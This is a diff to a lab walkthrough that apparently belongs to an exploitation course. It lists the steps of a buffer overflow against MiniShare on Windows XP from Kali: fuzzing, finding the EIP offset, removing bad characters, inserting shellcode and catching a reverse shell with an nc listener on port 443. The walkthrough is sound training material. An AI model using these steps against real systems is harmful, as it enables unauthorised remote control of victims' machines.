@@ -9,7 +9,7 @@ Kali Linux: attacker (192.168.37.128) | Windows XP: victim (192.168.37.134)
 -Step1: (Windows), open Minishare, Immunity Debugger/Attach/Minishare
 (if needed Immunity Debugger/Debug/Restart (Yes), /Play)
 
--Step2: (Kali), python mini-1.py 192.168.37.134
+-Step2: (Kali), python2 mini-1.py 192.168.37.134
 check: EIP 41414141
 
 -Step3: (Kali, generate pattern for checking offset value of ESP) 
@@ -17,7 +17,7 @@ check: EIP 41414141
 Copy the pattern to mini-2.py
 
 -Step4: Immunity Debugger/Debug/Restart (Yes), /Play
-python mini-2.py 192.168.37.134
+python2 mini-2.py 192.168.37.134
 check: ESP Ch7Ch8Ch9 ...
 check: EIP 36684335
 
@@ -27,18 +27,18 @@ Exact match at offset 1787
 Edit mini-3.py
 
 -Step6: Immunity Debugger/Debug/Restart (Yes), /Play
-python mini-3.py 192.168.37.134
+python2 mini-3.py 192.168.37.134
 Check: ESP "CCC ...
 Check: EIP 42424242
 Add badchars to mini-4.py
 
 -Step7: Immunity Debugger/Debug/Restart (Yes), /Play
-python mini-4.py 192.168.37.134
+python2 mini-4.py 192.168.37.134
 Click ESP, right click/ Follow in Dump, check Hex Dump: 01 02 03 ... 0C 0D 0E ...
 Edit mini-5.py, remove the value \x0d
 
 -Step8: Immunity Debugger/Debug/Restart (Yes), /Play
-python mini-5.py 192.168.37.134
+python2 mini-5.py 192.168.37.134
 Click ESP, right click/Follow in Dump, check Hex Dump: don't see 0D
 
 -Step9: Immunity Debugger/Debug/Restart (Yes)
@@ -51,6 +51,6 @@ Add the shellcode to mini-6.py, remove the badchars.
 -Step11: (Kali) nc -lvp 443
 
 -Step12: Exit Immunity Debugger. Open Minishare.
-python mini-6.py 192.168.37.134
+python2 mini-6.py 192.168.37.134
 (Kali) At the terminal running nc -lvp 443 dumps the terminal of Windows XP (for example: C:\Documents and Settings\victim\Desktop\MiniShare>). Now, you can run commands for remote control.
                                                                                              
